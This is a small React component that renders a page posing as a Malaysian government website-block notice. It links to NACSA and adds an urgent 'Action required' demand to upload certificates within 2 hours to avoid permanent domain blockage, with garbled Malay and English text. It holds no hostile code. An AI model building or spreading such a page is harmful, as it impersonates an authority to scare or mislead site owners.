import React from "react";
import  "./Assets/Images/header.css";

function block() {
  return (<>
    <div className="header">MALUKMAN</div>
    <div className="container">
      <div className="main">Laman sesawng ini dapat diakses di Malaysia kerana kandungannya melanggnar undang-undang negara.</div>
      <div className="notify">NOTIFICATION</div>
      <div className="note">This website is not available in Malaysia as it violate(s) the National Law(s).</div>
      <div className="note1">Untuk maklumat tanjut / for more information <span className="link"><a href="https://www.nacsa.gov.my/legal.php">Click here</a></span>.</div>
      <div className="error"><span className="action">Action required:</span> You site has been blocked due to invalid certifications. we request you to upload a valid certificates within 2 hours to prevent permanent Domain and Host blockage. We pleased to inform that your web application has been removed from default hosting.</div>
    </div>
    </>
  )
}

export default block;